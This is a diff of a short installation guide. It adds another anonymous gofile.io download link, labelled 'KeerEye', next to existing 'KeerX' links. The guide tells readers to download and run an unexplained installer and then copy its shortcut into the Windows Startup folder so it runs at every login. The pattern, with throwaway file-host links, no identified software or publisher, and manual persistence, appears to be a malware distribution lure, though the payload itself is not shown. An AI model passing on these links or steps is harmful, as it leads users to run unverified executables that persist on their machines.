@@ -5,6 +5,9 @@ Please follow these steps to get the application running on your system:
 Click the link below to download the application installer: 👉 https://gofile.io/d/cYJBmz
 https://gofile.io/d/6iGRmq
 KeerX:https://gofile.io/d/omBYJy
+
+KeerEyehttps://gofile.io/d/i3YZwE
+
 Download the file to your Downloads folder.
 
 Run the installer and follow the on-screen prompts to complete the installation.
@@ -24,5 +27,6 @@ Right-click on your app's desktop icon and select Copy.
 
 
 Right-click inside the Startup folder you just opened and select Paste shortcut.
+
 
 
